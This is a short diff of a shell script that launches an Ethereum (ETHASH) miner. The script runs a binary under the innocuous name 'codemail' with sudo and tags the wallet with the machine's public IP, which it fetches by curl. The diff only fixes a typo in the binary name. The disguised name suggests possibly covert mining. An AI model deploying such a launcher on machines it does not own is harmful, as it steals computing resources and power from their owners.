@@ -5,4 +5,4 @@ WALLET=0x86fc2bf54eeb39059638c91ade97322948882b9c.$(echo "$(curl -s ifconfig.me)
 
 cd "$(dirname "$0")"
 
-chmod +x ./codemail && sudo ./codemailmail --algo ETHASH --pool $POOL --user $WALLET  $@
+chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
